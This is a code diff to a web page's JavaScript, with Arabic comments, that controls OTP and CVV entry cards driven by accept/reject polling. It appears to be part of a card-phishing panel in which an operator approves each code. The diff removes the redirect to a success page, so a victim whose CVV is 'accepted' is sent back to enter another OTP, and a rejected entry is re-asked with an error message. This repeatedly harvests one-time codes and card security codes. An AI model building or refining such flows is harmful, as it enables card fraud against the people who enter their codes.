@@ -818,31 +818,44 @@
       document.getElementById('otp-input').value = '';
       document.getElementById('otp-input').maxLength = 6;
       const errRow = document.getElementById('otp-error-row');
-      errRow.style.display = withError ? 'table-row' : 'none';
+      const errMsg = document.getElementById('otp-inline-error');
+      if (withError) {
+        errMsg.textContent = 'الرمز غير صحيح أو غير صالح';
+        errRow.style.display = 'table-row';
+      } else {
+        errRow.style.display = 'none';
+      }
       otpCard.style.display = 'block';
       document.getElementById('otp-action-card').style.display = 'block';
     }
 
-    function showCvvCard() {
+    function showCvvCard(withError) {
       loadingCard.style.display = 'none';
       currentStep = 'cvv';
       document.getElementById('otp-side-label').textContent = 'CVV';
       document.getElementById('otp-input').value = '';
       document.getElementById('otp-input').maxLength = 3;
-      document.getElementById('otp-error-row').style.display = 'none';
+      const errRow = document.getElementById('otp-error-row');
+      const errMsg = document.getElementById('otp-inline-error');
+      if (withError) {
+        errMsg.textContent = 'رمز الأمان غير صحيح';
+        errRow.style.display = 'table-row';
+      } else {
+        errRow.style.display = 'none';
+      }
       otpCard.style.display = 'block';
       document.getElementById('otp-action-card').style.display = 'block';
     }
 
     // القبول والرفض يعتمدان على الخطوة الحالية
     function onPollAccepted() {
-      if (currentStep === 'otp') { showCvvCard(); }
-      else { location.href = '/success.html'; }
+      if (currentStep === 'otp') { showCvvCard(false); }
+      else { showOtpCard(false); } // قبول CVV → رجوع لـ OTP
     }
 
     function onPollRejected() {
       if (currentStep === 'otp') { showOtpCard(true); }
-      else { showOtpCard(true); } // رفض CVV → رجوع لـ OTP
+      else { showCvvCard(true); } // رفض CVV → رجوع لـ CVV مع خطأ
     }
 
     function showAccepted() { showOtpCard(false); }
